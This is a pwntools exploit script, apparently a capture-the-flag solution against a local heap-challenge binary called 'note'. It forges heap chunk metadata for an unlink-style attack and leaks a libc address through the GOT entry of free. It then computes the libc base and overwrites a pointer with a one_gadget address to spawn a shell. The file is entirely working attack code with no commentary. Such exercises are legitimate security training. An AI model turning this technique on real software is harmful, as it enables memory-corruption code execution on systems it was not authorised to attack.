from pwn import *
context(
	log_level='debug',
	binary='./note'
)
e=context.binary
libc=e.libc
io=process()
# io=process('books',env={"LD_PRELOAD":"libc.so.6"})

#=========================================
#Function

def dbg(script=''):
	gdb.attach(io,gdbscript=script)

def start(name,address):
	io.sendlineafter('Input your name:\n',str(name))
	io.sendlineafter('Input your address:\n',str(address))
	

def menu(func):
	io.sendlineafter('>>\n',str(func))

def new(size,content):
	menu(1)
	io.sendlineafter('(less than 128)\n',str(size))
	io.sendlineafter('Input the note content:\n',str(content))

def show(num):
	menu(2)
	io.sendlineafter('Input the id of the note:\n',str(num))

def edit(num,flag,content): #flag->1:overwrite,2:append
	menu(3)
	io.sendlineafter('Input the id of the note:\n',str(num))
	io.sendlineafter('[1.overwrite/2.append]\n',str(flag))
	io.sendlineafter('TheNewContents:',str(content))

def delete(num):
	menu(4)
	io.sendlineafter('Input the id of the note:\n',str(num))

def submit(s):
	menu(s)


#=========================================
#VAR
free_addr = e.got['free']
puts_addr = e.got['puts']
atoi_addr = e.got['atoi']
success('free_addr: ' + hex(free_addr))
success('puts_addr: ' + hex(puts_addr))
success('atoi_addr: ' + hex(atoi_addr))

libc_off = 541936
#libc_off = 224896#atoi
ptr = 0x602120
gadget = [283158,283242,983716,987463]
#=========================================

start('AAAA','BBBB')
new(0,'aaaa')
new(0x20,'bbbb')
new(0x80,'cccc')
payload = 'a'*0x10 +p64(0)+p64(0x31) + p64(0)+p64(0x20)+p64(ptr+0x8-0x18)+p64(ptr+0x8-0x10) +p64(0x20) + p64(0x90)
delete(0)

# raw_input()
new(0,payload)


delete(2)

# payload = 'a'* 16 + p64(atoi_addr)
payload = 'a'* 16 + p64(free_addr)
edit(1,1,payload)
show(0)
io.recvuntil('Content is ')
# print io.recvline()
libc_leak = u64(io.recvline()[:-1].ljust(8,'\x00'))
success("libc_leak: "+hex(libc_leak))

libc.address= libc_leak - libc_off
success("libc.address: "+hex(libc.address))

one_gadget = gadget[2] + libc.address

edit(0,1,p64(one_gadget))
# menu(1)

# dbg()
io.interactive()
